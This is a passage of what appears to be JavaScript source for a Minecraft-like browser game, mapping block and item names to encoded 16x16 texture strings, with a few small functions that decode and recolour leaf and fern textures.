    copperBlock: "0g0g86ZYHZWXH>YzW0g]029+48UIAeT?dy^|9i8[4k,05D9:@9yechm]jQ/J",
    
    crackedPolishedBlackstoneBricks: "0g0g6(H|BHkMW;HwZAZ4$cSm0qcE[qrKB2t+2bi!VEyFi^Egw!l!|-2A,raiI!4wPy?AP]J^Fi",
    crackedStoneBricks: "0g0g7WZZYEYYY5CJFFBdQ6{-|!PA0?p<?2%00P8NJCOcTAE@i9ABQpR<00%00",
    
    diamondHoe: "0g0ga000cHOY#qZ8JWCY]HMZJHEY000000000001h000000iOg000004?M000004V000000U000006S0000000000600000000000600000000000600000000000000000000000000",
    goldenHoe: "0g0ga000HZHH;ZH]HMZJHEY000000000001h000000iOg000004?M000004V000000U000006S0000000000600000000000600000000000600000000000000000000000000",
    ironHoe: "0g0g9000?kHZZZYoYcW]HMZJH000000000001h000000iOg000004?M000004VX000000U000006S00000S000006000000S000006000000S000006000000S000000Q00000000000000",
    stoneHoe: "0g0g9000PAYYEYoYZ]HMZJH000000000001h000000iOg000004?M000004VX000000U000006S00000S000006000000S000006000000S000006000000S000000Q00000000000000",
    woodenHoe: "0g0g8000)WJHWwKYTZ]HMZ000000001A0000a0004000i00003:0000r0000000060000N00010000c000000003E00002S0000000000",
    
    podzolSide: "0g0g#{ZQZ1ZQYhZhZ]ZxZJHxZVWSZ{ZZUZZ1ZUZZ|W{Z]YxZ1ZZQZWxZWUZZlZQYYYhZQYxZYZZoHH0ggcA)Q4@01P*l.46p9%[3ER9oD/xFoooonEnEooEEpFoEn!oEEDonEoponqEE",
		podzolTop: "0g0g6hYYMW]YWJW4_KmpAww4A48hiT6ci1PA25Px]0c(xI44iym0B%&o9++aw]",
    
    rawIronBlock: "0g0g7HZW,H#W>HZY4+d08P0zyJ6R)*j4EXl*8C1b+])F1c++sP1Rq|q_<y$)wE0B",
    rawGoldBlock: "0g0g6ZMZHYjWZZ0rnoO?hwXByB^rF1zyhP(RN]?iK]k$@RxyENQ4FiF3",
    rawCopperBlock: "0g0ghZZWY+YHOYYnWHXH|ZHWZ}Y.W020ypa(00p9h{kaoST1^-SKEwE623001k69o8S30/iDc(0ox0QM58-a+kxES0F8a578c2co1+c00j!RXX6}Xs{jFX&g",
    barrier: "0g0g40000W0W0W00001SaqS2F0aE0F$E0$E2$EaS$EF0$E0$!0qS2e3ZZ0000",
    
    netheriteSword: "0g0ge000]WHwTWWkZVZ(JH{Z$WKWkW-YkxH0000001h000000iz000001Az00000i(00001?>00000m(00h01000mgl(0001T00001Q(00000m000009(0000(O000h00O000n(000000(000000",
    netheriteShovel: "0g0gc000]WHwTWVZW{Z$WkWKW-YT4W0000000000000000000001h000000iy(00001A?(0000l@?(0000700000*(00007300000(000007000000(00000G000000(0000003(0000000000000",
    netheritePickaxe: "0g0gc000]WHWVZ$WwTW{ZkWKW-YT4W0000000000000000000hhg00001yzTl0000m000000@000005K0000KK00050K000K0K00500K00K006005000000K00000000000000000000",
    netheriteHoe: "0g0gd000]ZHoHW(JH$WKWVZkW{ZT4W-Y000000000001h000000iyg000003)B000003X000000000006(00000(000006000000(000006000000(000006000000(000000O00000000000000",
    netheriteAxe: "0g0gd000]WH{ZWVZKWwTW(JH$WkWT4W-Y0000000000001g000000ix000001zM00000kO*K0000O00007-,00000,0000970000000009000000000009000000000000G00000000000000",
    netheriteScrap: "0g0g8000SHnZkWZY]ZASY00000000040001Fg000^}00j/S0u@300HuZ00Z6PA00z00o00f,0001000000000",
    netheriteIngot: "0g0gb000AZ|4W(YPkY|AZVYW-YgTW;W000000000000000000000h000001hy(000hk?z01hQU(myVG>iVDG>qG/oIG^OOIqI]OO3^O00/.00003.00000000000000000000",
    
    itemFrameWood: "0g0g78HYEZGHHHCW4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
    itemFrame: "0g0gbEJW(Y)ZAW2YiYyYNYWW)Y1iyyxhhjkQQQ?U?TmVV[BAUBITCICIIIICkVIIIRllIlV?VUGlU[VTkQ@?1qhhyyyg",
    stonecutterTop: "0g0gaHYH-ZYxHYZZ?W0iOOOOx04DGGSlyCyDBCyGOGC,yONOGGGCCz,OzNyGNIIIIO,,GO,OO,DyDDz,G,GGOCDlDyGB4GGGGS0iOOOOx0",
    stonecutterSide: "0g0g80002HH{ZYHZ-Z000000000000000000000000000000000000000000F%?ZE^P{AJ]EFZH?",
    stonecutterSaw: "0g0g700WYZZZYY8WW00000000000000000000000000000000000000000000000000000000P00m?y00^MA1Jy5oPiI8_Ec",
    stonecutterBottom: "0g0g5?WH8WoYZ0000005APiK9iPdikJ]9AdPodFC4A9+9(gdAP]d)diJQK000000",
    brewingStandBase: "0g0g6ZHZZ8W-Z0000iS0I4J05]604]I6k?A5F5:&h0U0xyV0x:}xFy4QPy0cPi1(Pk0k4J00J0000",
    brewingStand: "0g0gp000;Z|)Z(WWOZZsZWZYzZWiHHHYZZZYY3WHHwYY00g00000000h0000w000Mg?(Ix002Aw@OX006884c000EE40080gE503kg(503gE5004(g200E000000I0005K0k00000000o00000000o0000",
    cakeTop: "0g0g8000YZYZZZZYHW0000004]5+I9P9j+ddeCdNdd|995+|I4I000000",
    cakeSide: "0g0ga000YZYZZZ_Y2HyHZZH00000000000000000000000000000000000000000000000000000000000000001zOOOONg1zOOOONg1iONzOxg4lmlS7777VVVV",
    cakeBottom: "0g0g5000Z2HyHW0000004FA]5AJPCI9yPk9P(J9j9A8J^Bi9oPA9J{A9yPBkI5B9A9i^(J9yPFk5kPAI4JF]000000",
    cartographyTableTop: "0g0gr{Y]HY-W;WsHYZWH(Z]YWZEKZZZZW-HY)Y1W1W;ZY$WZVHH0Sx8R0Xx8302Mw02g0X9as4x4Xxzq*ig<e0Q>6Tw8A>8<xx20XzQx8TAQh7&0X0XRQv4A0S00A>zEX>AQ#iFM-4gSRAw0g4x^02RgXEq.",
    cartographyTableSide3: "0g0g8YhZ(Z;W]HEKZ{Y-W4P4P}:5~(*f+f-5wYoX5o4fwa}*ow4_(_b~*!J!J",
    cartographyTableSide2: "0g0gohZY-W)Y;ZYW1W1W]H{Y(Z;WEKZ$W1WWZZWHYZ1ZWQH00g0104NkRak^iaaQ+aiw!^U8w2RU+aaRU$agca0g01a8{gXR^B^!wya!amcagCaa^wXx8wF{F{",
    cartographyTableSide1: "0g0gk1W;ZY)Y$W-WhZY1WoYW(Z;WEKZ]H{Y1WWWZZW0RxF^/ihFOO.8g>.gRh>%+F%F^O*Ogx8X?>%O-MI.OM.OlOI*O.OgXxm*>oM>*F{F{",
    
    smithingTableTop: "0g0g7PBZT5WZ-H)ZAJZ$H0J2S0i4A^dr6PA])a6oerPoe>R]&_NbNP8R|8NP8d]?]41wS",
    smithingTableSide: "0g0gh-H)ZAJZ$HT5WoZgTWSH]YWJWYPBZZ$WwWzH02xXoTKoy?oMcgXI>gXx8RMMoF.hXB7.whMXEp(-p,RghT/gXwhB^kEpB-p}8Rg1X.7.Xw1U^EF.-",
    smithingTableFront: "0g0gf-H)ZAJZ$HT5WoZgTWSH]YJWPBZZ$WzHW0iMOO4O(OyBOOzNyBNzyyyyVVGIIGCIXGIIB^P+*G]I[BIIB**IIIG[5IIG5VV",
    smithingTableBottom: "0g0g5oZ]YSH$WZ0JFy1$xNR$JPBq!AJPBp}AJPA}AJPBq{JPBq$JPA!AJPA!AJPBq&AJPBp}AJPBh{xCR11iBi",
    
    enderPearl: "0g0gb000cW+YCnHhW0JWWL:W9)W4WpY00000000000000000001h000001izh0000izQO001zIQ*001CI?00i,VX0]V)0]VA05-B005)II?000]NA0005UQV000005V00000000000",
    netherWartIcon: "0g0g8000YW0Y{TH{TS00000000000000000000000000000001NC00200dx000J001,000i000C00000000000000000000",
    flowerPotIcon: "0g0gg000(W)W-W-HY3WjHWUH{ZHHQWZH0000000000000000000iz00000>>0004IIS009II0090090000000000090000b00000000000000000000000000000000",
    cake: "0g0gh000!ZHZWZZZWZYHYxY;Y2HRWHHW0000000000000Xx8Rg0002hcowX00QRkM8R8w8IcTIgT8TE(]Nw8IQcT8RcT8NgXxgTIT]Mgx8F^XMgXx5#_qxgC#^4#2U<wK0i<0005000000000000",
    
    furnaceFrontOn: "0g0gi)Z;YYHYJPWoHwWgTWYWsHZ(WYZKWZHZZZ00008R0X00XMIoMc96>M{IK0K.jcS0kx8Rg8Xw.Xk0X4x8RXk8^8MgwxIS2w2AMJ3it8Re1^6d0(9@Kd8huXT",
    
    goldNugget: "0g0g8000SZ@YYgYZZZHW000000000000000000000000009w00000000000000000000a0000a0000100000000000000000000000000",
    ironNugget: "0g0gc000-0Y-%YHWZ-W-ZY%Y000000000000000000000000000000000001g000000yMh00002?yzg000B000CV0000#QI00008I00000000000000000000000000000000000000000000",
    redstone: "0g0g8000gW0W(W0WSgW$0W)gH000000000000000000001w0000a0000G000200m00Y03q0+00dYK000+00000000000000",
    
    pumpkinTop: "0g0g8HWxZYYWgWKH0gw211yJFyI9Ajdg0)Em9l0Xg9GyPg84xx=]do74J{wy8ASxQ85JF2IxwPy9m9hwgh101",
    pumpkinSide: "0g0g6HYWxZYZ0g1S4T%lzNRx&zA&SK%%%%%%%%%%%r%%xx0a19q?P|",
    carvedPumpkin: "0g0g8HKYWTZY$0WQSWZ0g1S4T%irQyx&#+K%,%,%,%O%e[r%>&&x+rx%9w[9~",
    jackOLantern: "0g0gaHWKYTZYZ6HZHZWHZ0102g0i2O(3(j(jN4SV433RzSU5V(Sz*5(z*5GKOz*lGOz)G(k>zO>43Q)Oz**35*OzVVVOzGGGw*76w)Oz-NJ90ywyJ9JFwyJFJF",
    
    pumpkinSeeds: "0g0g4000YoZZ00000000000000000g000o0S0$0K0So0010001TK2020000000000000",
    melonSeeds: "0g0g4000HEYsH0000000000K00000000KS00K000Q01002T020000000000000000",
    
    shears: "0g0g9000YYHW3HOZZT4W00000000000000000000iOw00001>N20000lzwz0001N2O000mwzN000m2N[00104x0010hn0002xhV000w4VG0000S8G000008000000000000000000000",
    
    melonSide: "0g0g5RWZ*Z1ZMZ5NaQmI5yakS58kS51K8xT%T%TxTK51k5y1QkI5RbQ385XObRbRbR86ycQ38",
    melonTop: "0g0g5RWZ1ZMZ%Y5N1mI0TQATwkT?2a0j{8{XACaSA90S]2ph0JwxijwisI0P4{Xx(a8mg5^QX>?A1wRw5y2wkI",
    melonSlice: "0g0gd000yWYW[YWYKZYZKZ?(ZZ000000000000000000000i0000003?w00000O)00003-0000.+i0003Or000+O-r003r00OO01>OO0bUII#000Vh#000b00000000000",
    
    glowstoneDust: "0g0g8000yWZZZWZZ000000000000000000001w0000a0000G000200m0003!0+00dYK000+00000000000000",
    redstoneLamp: "0g0g8(WQYHNYHYWZ0000004CaU81<d5gba@r=D9g0rS070hhpmmdRSb51p4l98000000",
    redstoneLampOn: "0g0g6-HQHWYHH0000004C981.e59a@.getD9X0S060dgejne@RKo951.e4k98000000",
    
    quartz: "0g0ga000WZWWHH#YZY00001h000000ix001h01y)001ySizU001y)j+001OmXh00@l@M004V[01kV01xThg4N]g4AG[,S9G00I00990000000000",
    
    endStone: "0g0g6HHHYoYZ4XI}iAEg9n8?wRa^XT(!IxoV]XIPanhTNR]Rjo]&wA2R9hB4}gSS#zwwAb(yT5",
    endPortalFrameTop: "0g0gaTHpWB3YY%Z8HZY0SZ4H000000001yxN?iyg25(?K3S2,0Q+S2+4RRAS2EIIS1]g4]S2ES1]g4ES2+SS04S2,4Q+S25(@3S1QTU>kQg00000000",
    endPortalFrameSide: "0g0ge000TH%ZpWoZgHlZHYoYHHHZ000000000000000000000000hhhhhhhhz?VVVVUNAGGGGRBIIR?PUUyyyhiVVVVVVGGI",
    eyeOfEnderBlock: "0g0gc0000WoYFVW6Y.Y_H.ZWpWoWW00izNx0000hyyh0000hhhh0000hhhh0000izNx0000y?Uy0000zN0000*0000*0000zN0000y?Uy0000izNx0000000000000000000000000000000000",
    eyeOfEnder: "0g0gd000MHtzH}8HZZY5YY@YQWgWoW00000000000000000001y000001jOy0000jQQTw002)Qi002?!X_00x@JT0xIT0x]02)F_002j]-r000OOT000bh00000b00000000000",
    
    chiseledRedSandstone: "0g0g7WYHWZW(Y00TAJ^|A+J00AJ9*[tm.GMJAJ&]]||sJ]",
    cutRedSandstone: "0g0g7WYHWZW(Y00TAJ^|A+J00AJ9)[t9m%|)MN+@&*r},C+F|]^U",
    redSandstoneTop: "0g0g5TWJWZHZ5y^yU?AP({CiPS?iA1Ai]JxiUEyUAyEyPJUCREJEK?iMj4B@CiA^PQTo^]^",
    redSandstoneBottom: "0g0g6(YZHWWY5DqJi!@0J()c8bco^]Q$J+0m4J*A|?EKp$2pyrzzJ6t4N]a}Fyt{0",
    redSandstone: "0g0g7WYHWZ(YW00TAJ^|A+,yPeP|*_y)RDAi$F+",
    redSand: "0g0g6YJWHZWW4?r8@+9AFNPE^$NKi$_%bi5J((BoPlm?laEE?o?k$",
    
    purpurPillarTop: "0g0g7HYZrWZWW4^4PNi+Mn>h%AJPdRPFRJPKF@J^JA9RJ+FV!A0(b0PNnFMiFAARP",
    purpurPillar: "0g0g7HZrWWYWZ5MBi_9(K9-I<-8BiKaK6I_X-5MB2K9-K9-I<.9MBi8K8I_X-_",
    purpurBlock: "0g0g7HYWrWZZW42a42%%*&lmlm+,::?iPi0R4^%%e%n*:*:m:+PAJPAJ",
		
    seaLantern: "0g0g[DZnY}nY-W}nH-WDZ-WDYWJWZZ$WYH{Y{YZbHZDYnHHZZWWZZY}7HJHHWHHY^7W$WZZZ^nYHWH;HZ;Y^7HEWWYEWZWZHbHYWYWPHYYWPW@7H?W04g(02a08Kwgg]6uSyaX$A6|r+4=9]pCckRz^#6SB!$^n8?#m$]-*bm)a?#)02*bmA]XeBa$RPCa^UE>[[n4]JA]q*]=nes+444(xsAg11iyKa(092",
    prismarine: "0g0g5H@DH;WZ=6Y5({Igi|o)c?8^m0wARS^KmAwkb)ii}6R5Cj0j95F0$8SF(Q$2C2(zP004{Nc1X1i",
    darkPrismarine: "0g0g6<Z/6YMQW*UYAH.W4a4^xsxsd^dwAJByK0CcddSBiBy4^^ysCsdxByBy^4Rx$xsdSeByBy",
    prismarineBricks: "0g0g8Z;HrZ@DHHR6YWY4J]QJ(0BwSz(86w5g~ST<2x<S9:y1B8j1PuT{SiZ3;A234j<DjWiZJBW",
    
    prismarineCrystals: "0g0g6000YYZPZrH000000000000000000009w0000Q008001j^000PNS002XJ00kS0+0#02J]02P0000000000000000",
    prismarineShard: "0g0ga000WaZR6Z{WY%WHMYMH000000000000000001g0000001xg00000MQ?00006QATg0006Q000ykR?00DAQ0006yQp0006iDD0000y0000p000008h00000000000000000",
    
    darkOakLeaves: function(n){
      var pix = getPixels("0g0g5W000HYZ0yUzFB?iJ!0SJ|NAmPi0pX%k2y{%)sQ4Aj%I22^9Q81wq?)A]hJ")
      for (let i = 0; i < pix.length; i += 4) {
        var bright = avg(pix[i],pix[i+1],pix[i+2])
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    spruceLeaves: function(n){
      var pix = getPixels("0g0g6EY000|)ZYVVHT4W4ww>c4bA(_(&-c_A$9)p8i>4Pw__Awci$Ng$T(|4?&-$Jo)s8m")
      for (let i = 0; i < pix.length; i += 4) {
				setPixel(n, i >> 2 & 15, i >> 6, pix[i]*(80/255), pix[i+1]*(200/255), pix[i+2]*(80/255), pix[i + 3]);
			}
    },
    jungleLeaves: function(n){
      var pix = getPixels("0g0gb000WoHYHyW5ZHHHDW0i2j4)TiOi2NOQ2xRO0Ow00AAO0y02*4>(yi0Bz(3Mw05S0Qz0yw)A0R3MwA)2]Qz04Qx?>>0wSyBNS2jOR40Oj2hAQ033N02>)0N000wQ)0M(0Qz4Swxz3>>w")
      for (let i = 0; i < pix.length; i += 4) {
        var bright = avg(pix[i],pix[i+1],pix[i+2])
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    floweringJungleLeaves: function(n){
      var pix = getPixels("0g0gb000WoHYHyW5ZHHHDW0i2j4)TiOi2NOQ2xRO0Ow00AAO0y02*4>(yi0Bz(3Mw05S0Qz0yw)A0R3MwA)2]Qz04Qx?>>0wSyBNS2jOR40Oj2hAQ033N02>)0N000wQ)0M(0Qz4Swxz3>>w")
      for (let i = 0; i < pix.length; i += 4) {
        if(abs(pix[i+2] - pix[i+1]) < 10){
          var bright = avg(pix[i],pix[i+1],pix[i+2])
				  setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
        }else{
          setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i+1], pix[i+2], pix[i + 3])
        }
			}
    },
    acaciaLeaves: function(n){
      var pix = getPixels("0g0g6oH000HYZoH5yPQ>CEK$wA51]XA^yAIQBUNiXP(k^Sc4UPwA]BS(mQ|JJ$RNwBwAER@6X]XJs")
      for (let i = 0; i < pix.length; i += 4) {
        var bright = avg(pix[i],pix[i+1],pix[i+2])
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    birchLeaves: function(n){
      var pix = getPixels("0g0g5oH000WYH4P]kFXxJRAARA^cB@8@QNEX^{iBjp0SF2BXPA2@N^8]]Rb4XBh9%xy^xy$kiEIXP9EXI")
      for (let i = 0; i < pix.length; i += 4) {
				var bright = lerp(0.125,avg(pix[i],pix[i+1],pix[i+2]),192)
				setPixel(n, i >> 2 & 15, i >> 6, bright*(163/255),bright*(255/255),bright*(92/255), pix[i + 3]);
			}
    },
    oakLeaves: function(n){
      var pix = getPixels("0g0g5Y000YYH0NUz&NCR?JJ&0SJAi0pXNmk2N{MQ4%I^2^PQ81wq?)A]2i")
      for (let i = 0; i < pix.length; i += 4) {
        var bright = avg(pix[i],pix[i+1],pix[i+2])
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    
    spyglass: "0g0ge000>YYtHNPWZWWZZZYYYUH(W0000000000000iw000001)00000?w0006n)Vg000>g000n0009y000i#0000000b0000C0000bJ00000d00000000000000000000",
    
    noodles: "0g0g5000zY-HZHY0000004y1x0Bn9iMpb]oEob{mEoakEoak8Epa8!Oa9!3qFRM5SMI5@R41@@4c1g?{002S2S",
    egg: "0g0g7000WZ.YH5YVOY000000000000000000009A0000002003zK00lr00m$00m$00m$00kP00d^00100000000000000",
    orange: "0g0gk00WHT0WZY$WTWSWYwHHZZZPHZZWhWWWZY000000000000000800000000800000000E000001/i0000OF^RX000*%X006MA006M^Q006F^Q008F^AQ001,@OI001)xI00088Rhg00000@M0000000000000",
    ramen: "0g0gi00W*hYAW$H4YWH(WsHZWZyZ;YsW-H(ZY(Y000000000000000000000000xg0000000c>g000000048000000RIzM00008k^{00oRRk)00ok.)00o.8)001n60006fq000001S000000000000000000000000000000000",
    bowl: "0g0g8000;YY(ZSYsW-H(Y00000000000000000000000000000000PA00ii00y^?S0AJS0BS000b000%00000000000000000000",
    mushroomStew: "0g0gb000;YZ+ZYsWQZ(ZY-H(Y0000000000000000000000000000000000000000001hhg0001iOyxg00jQQ>OB00mOOC00n00aGGG000VV00000VV000000000000000000000000000",
    
    largeFernConnected:[
			function(n){
				var pix = getPixels("0g0g5000WYPHZ0000000000000000000000000k00000S0y00y0S04aA00yMw00_(09c!N010002E00nbN00S0>JS")
				for (let i = 0; i < pix.length; i += 4) {
					let bright = pix[i]
					setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
				}
			},
			function(n){
				var pix = getPixels("0g0g6ZZZEZHYVW0S5og]p82U^mlEy!S^}g12S0Qk0>p]S00%i02b]oK9A+J0PK00000jQ0002(00")
				for (let i = 0; i < pix.length; i += 4) {
					let bright = pix[i]
					setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
				}
			}
		],
    fern: function(n){
      var pix = getPixels("0g0g8ZZY000YHEZZPH00100200sK0200tK0200kS020d0200{L02dg02UQ)0dL0402010200)0200nS0200cw02")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = pix[i]
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
    },
    
    "water0": "0g0g8c%|%;ZZ4APyPBAJBAJA0Fy1A2P]JJ?AP]TAiJ4JPAJTAJSw_PAJPAFAQPPAJPAPAJPkJFAPA2PAzawAiP",
    "water1": "0g0g8c%|%;ZZ4A&PyPBAJBAJBPFyBP]JJ?APABJAJPA:iAWA{PAJPAFAQJPPAJPAPAJPAJFAPBPAJL$BJ",
    "water2": "0g0g8|%ZZc%;4AJsPyP?AJBAJCPFzAP]J?APACJAJAtfiAKA]PAJPAPA]JPPAJPAJPAJPAJFAPCPAJ)W^)+J",
    "water3": "0g0g8|%c%ZZ;5CFAC]J|PkJAPCPCF$x(P)4]AJ|]JQPxxQ",
    "water4": "0g0g7|%c%;ZZ5CFAC]J|JPkJAPCPCByM-P)4d2]JAJ|]J]IPw1Q",
    "water5": "0g0g8|%c%;ZZ5CBAPCJJ|JPAJAPAPCByMwPA2]~JP|F]]IPy1AA^",
    "water6": "0g0g8|%c%;ZZ5+BAPCJ|JPAJAP)PCB$.wPA]|AP|F]]PyPwA^",
    "water7": "0g0g8|%c%;ZZ5+BAP)J|AJR|PCB$.BAR|A]P|APJ|F]J?PyPwA^",
    "water8": "0g0g6|%c%;ZZ5+BA?AJFAJ|R|PABwFFAT|Ea]PPAPCJ|F]J?oPAP+J",
    "water9": "0g0g7|%c%;ZZ5)gyjAFJ||PABwMPAT|Fg^]PPAPCJ|FQJ?qPAPri",
    "water10": "0g0g6|%c%ZZ;5)0wjAFJ||PA?xxPAP|Fi]IPPA]JBCJ|FPAJ?qPAPii",
    "water11": "0g0g7|%c%ZZ;4I]aPAJJQ/AJPiPFkJ]JPAFAJAP$AJBA>PBAJQJPAJPyPAJ?AJPBAJAAJPPAJ%AJn+",
    "water12": "0g0g7|%c%ZZ;5)Awb(AF+J|A|PkJ?wxPAPPFyJPgSFA]|B+JPPPAJQPAi",
    "water13": "0g0g7|%c%ZZ;5AACaPAckI689PAJAPkAJJQPAPkJ?wp^AJ^]FyJPgS!PAA]PAJQJPAPAB]PPy^PiPAJPAAUPA2",
    "water14": "0g0g6|%c%ZZ;5AwSEa+Nka89+|AJ||PAJ?y1PJPFyJPiSFA]|JB+P+PPAJ+APA",
    "water15": "0g0g8|%c%ZZ;5Aw_qaPAmAId]PAJAPJPiAJQPAPAJ?y1^QJP]FyJPySCPAAIPAJQJJPAPAB]PFy^PiPAJPyAPA",
    "water16": "0g0g8c%|%ZZ;0J^900I12#2J0J_%T%AJPwBPASQJPAJy0JR%P0A%AJP04_AJ]P",
    "water17": "0g0g8c%ZZ|%;0i^dSXX1JPA3A/AJi0JP9J{NRPCPxAJP01C]PA]JPAJr0A]NPAJRPJPAJPAw4xJPxAJPx0{AJ]_P",
    "water18": "0g0g7c%ZZ|%;0i^]X61JPA2/PA3JP9J{CRPCPxAJP01C]PA]JPAJr0A]JPAJ]PJPAJPAw09JPxAJ{x0{AJ]_(P",
    "water19": "0g0g7c%ZZ|%;0i^]X61JPA!PA3J]PXJ{CRPCPxAJT01C]PX]JJr0A]JPAJPAJPAJPAA0p9JPxAJ{94J{AJ]_NP",
    "water20": "0g0g8c%ZZ|%;0iR]X01JPA9!pA3J]PX{CRPCPxAJT06]P8JJ0AJPJPAJPAJPAJPAAKp9JPxXJ{94J{J]_{",
    "water21": "0g0g8c%ZZ|%;40aJ1J]JPA$APAs_JP0242P02PA00922]4JP0w0A094PA00JPAJPAJPAJPA0]q4JPA04P0w0401_4",
    "water22": "0g0g7c%ZZ|%;4JRSXg1JPA0iSA0J>cX{]PCPxAJSKAPJP94JJSwAJPJPAJPAJPAJPAC]4cJPAXJ{94J{J]_N{",
    "water23": "0g0g6c%ZZ|%;4JR0>Xg1JPA0JCSA0JjcPP9CPxASKwPJ]P42P(]wAJPJPAJPAJPAJPcJ]R4cNPAXJ{94{J]^{",
    "water24": "0g0g6c%|%ZZ;4JRSgRg1wJC^S]JJP%AS0PP409APwJP%Q4%P4_J]J_",
    "water25": "0g0g7c%|%ZZ;4>0JQg2PAJw@9XJ]PPiJPi^PAFAEJK0PPAPA09EPAJPiPAJPAJPAJPAPA|4FAJQ^]APi]G2^",
    "water26": "0g0g6c%|%ZZ4JR0Jsg9wJy-94PJPPCPAoKcJTP06A]AJP|P_4|+0PA|J02P",
    "water27": "0g0g5c%|%ZZ4]0JsQg9PAJAC-94PQP]JPi^PAAAJoKcJTBAT06A]AJPkPPAJPkPAJPAPA_AJFAQ2P]A^A02P",
    "water28": "0g0g5c%|%ZZ4P4JsQJP?AJAC-9APAP]JPi^PAPAAJ0KgiTBAT071A]EJPkPAJPiPkJPAPA]AJFAA2P]A8^AP",
    "water29": "0g0g7c%ZZ;|%44JsQJP?AJACPAPAP]J?y^]PAAJS0iTBASaA]PAJPAPAJ]J^PAJPAPAIAJFAA2P]DaA2P",
    "water30": "0g0g6c%ZZ;|%4AJsQPBAJAJCPFy9AP]JJ?y^]TAkAJT0iTBASaA]PAJPAPAJ]JPPAJPAPAEJFAA2^PAJyaw0iP",
    "water31": "0g0g6c%|%;ZZ4APyPBAJBAJA0Fy1A2P]JJ?y^]TAiJAJP0JTByS7A]PAJPAJFAJ]JPPAJPAPA]JFAPA2^PAyawAiP",
    
    "netherPortal0": "0g0gO]b{);K$Qbr;a-aF;aUs(e-XI)-a-aSb${bSa{)aEs(;u-$-aEX-K;)9s(I$-{bs-a;a=;b$b0gg3o8oJ(<4@]]4j1V2PX{*T86c?,dPApMUk9S4yoM9kS2,lSBU{[P?gp9M{18tgQlQPP1Abbe?B.b$5s39t{03^AyTk(h|19DI15(4",
    "netherPortal1": "0g0g.Sas{{;s(]bb-a)Qb;a$u-;;ar{b{bK$Us(&-aF)s(Sb$;aX$;I-a-aE)aESb))9K;;b$-I-a-9-XQb0ggsE)Ti6oXx?P%r%t9?%F%pADF{xh|AAqEwoRCEd&BA}R!56{#M(EJ&8~]o^wR<pUE@5iic^QB%",
    "netherPortal2": "0g0g;;aUs(K;)s(]b;-a$Qb-a;a{e-{bu-Sb)9$Sb$K$s(-9-aFs{-a-aESaX)b{b;a;Xr-II;b$))aEQb)9;0gRcT@k3A)M;k?t36?AUmcl%4rRwBg,vAxC$6[cd(aM4$??&4$;@hRwd4T4ks%CQ4dRPs$sKjxT%X&AsN!,]g}(EP3P",
    "netherPortal3": "0g0gM;arUs($Sb$Sa;$]b)K$-;-a-aEQb);asXs(-aIX;as({b;-a{;b$Sb)aEI)9{Ib)90ggw3kA^$-2Q26Sh*l?VV1(QXs0cQ(tlMB*k0l(C)0B{EJApj^pm[??dlAuU5ANduFV.S@a4@JN?6u6COA+$^9,u0jas&x.~pU9ma?0{}oJK",
    "netherPortal4": "0g0g+-ar]bUs($;a{b;aK;bQbs(;IsK$e-{-a{bSb$)9=)I)$-;-aESbs()aE-)Qb-aF{XSaI-9-90ggo^$d-hP)V%wKkssKStM0&i3c8*$5RA4)95NUPUa5&nzxN?4*zQd7#Io$1ltI9aE:7b0!sqB{T5S&?%zRcI_w>ql1",
    "netherPortal5": "0g0g,-a]bSb$K${;ar;as(s(Us()Xbs-aE{-9))Qb;{b-a-a=$$-aFSa;a;I-9;I;b$e-Sb{bQb)9K;)aE0ggw^8i)kX^4k{lVF5d5.1sm3Fq;0b5x46cs5gCP^Jk{y!6dXxqE;h6cxleD7cpE5[4_|JL1Bs_$wLK0Fx83lb",
    "netherPortal6": "0g0g*-aQb-aUs(X)]b-aEr$I{Sb$s(;Sa)9{b-XK$sbI;b$;a$s(-aF;aK;Sbu-);{b{;-9)Qb;a-a0ggs0o^$i{)4XhP*bSlPTSN3oDKc63-Ko8cjCxcl=@cIX!F!4wj|2Iyg)hL4jBJ85ow?Xe7555w*nO{OJ0A-xK88Qz",
    "netherPortal7": "0g0g,-a;a-as(X)Qb;b$Us(K${r;Sb$s({bs;a=X;$$-{]b-aEb{bSb-aSae-I;-Qb);a-9-aF-9K;)9)aE)0gg601o^$jd-?y0lBP25M;-I5w?5XQN]AQ3q4@-c0wxiP.44i?QD/02gmn^Kn4mlk-Ik^eTkrmD_;aEX}xuJi4gpQ}.h3w?(t~;;",
    "netherPortal8": "0g0gO-a-aFrI);a-9QbUs(Sa]bK${{b);;a$e-sQb{K;)aEs(Sb$bs(Sb;I;-$-a-aEX)9IX{b00RcS5o9E4(};2tj50A$f$4FQUAgy1jE)kGs1sK82)lm1izA(16*ntmh!60-gU%-oQkxhjBuhg%^<[C;k27ExksG",
    "netherPortal9": "0g0gM-a;a)9{bIK$-a)aESb-aE{)Us(;;rSas${;as()Qb$-bSb$;s(]b=X{bK;;b$-9-aFI0ggswk3d-hdAoK%^g*uKEo{9Az7!^&Pn+FomKblMdo5DFdp3!R!>[?^S$!d@^CV?vB9A{Uym~]*AxQyP3P01BJ>B",
    "netherPortal10": "0g0g*;aSa-9{b)K$-a)9Sb$QbUs(-a]b${br;-)$s(;{-aF;a{Sbs-aE)aEK;s(QbIe--9;b$Xb;-0gg6s@c(;QQIpASAc?1Bl-Ee(1iQc1x/Ne2>hBn(03gik-)Jfy0cAgwAMh361j$U0N?mOo8iJ0B}MKwAj4e0h6P.8",
    "netherPortal11": "0g0g*;a-9Qb)K$-a-aF)9]b-aX{br;{$s(Us())$;{bsI;aSb-aESb$s(;Xb-a;b$;a{)9)aESaIK;Qb00RcT@sy988c))094~xA0tIASmF3ao49fdl(kl3fcjPCzh*}<Nl82a0!dwEylU#;ilxX0Ih>MBLky$R3Q]SmxR=;kw2L-az0l!RhxzR)T(",
